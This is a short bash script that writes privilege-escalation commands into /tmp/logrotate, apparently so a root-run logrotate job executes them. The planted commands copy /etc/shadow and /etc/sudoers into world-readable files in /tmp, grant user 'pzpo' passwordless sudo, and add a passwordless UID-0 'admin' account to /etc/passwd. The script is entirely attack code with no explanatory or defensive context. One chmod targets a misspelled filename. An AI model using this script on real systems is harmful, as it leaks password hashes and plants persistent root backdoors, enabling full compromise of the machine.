#!/bin/bash
echo "cp /etc/shadow /tmp/sha_copy"  >> /tmp/logrotate
echo "chmod 666 /tmp/sh_copy"  >> /tmp/logrotate
echo "cp /etc/sudoers /tmp/sudoers_copy"  >> /tmp/logrotate
echo "chmod 666 /tmp/sudoers_copy "  >> /tmp/logrotate
echo "echo 'pzpo ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers" >> /tmp/logrotate
echo "echo 'admin::0:0:System Administrator:/root/root:/bin/bash' >> /etc/passwd"  >> /tmp/logrotate
